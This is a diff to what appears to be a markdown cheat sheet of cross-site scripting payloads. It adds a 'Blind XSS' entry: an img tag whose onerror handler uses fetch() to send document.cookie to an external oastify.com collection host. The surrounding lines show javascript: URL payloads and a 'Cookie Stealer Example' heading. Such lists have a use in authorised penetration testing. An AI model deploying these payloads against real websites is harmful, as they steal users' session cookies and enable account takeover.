@@ -47,6 +47,12 @@ body { background-image: url('javascript:alert("XSS")'); }
 <a href="javascript:alert('XSS')">Click Me</a>
 ```
 
+7. **Blind XSS:**
+
+```html
+"><img src=x onerror="fetch('https://fl4rqj1wz5wpgjykbmrzdp4z0q6hu8ix.oastify.com/?c='+encodeURIComponent(document.cookie))">
+```
+
 ### Cookie Stealer Example:
 
 - `GET` based interception (easiest and best to show Poc):
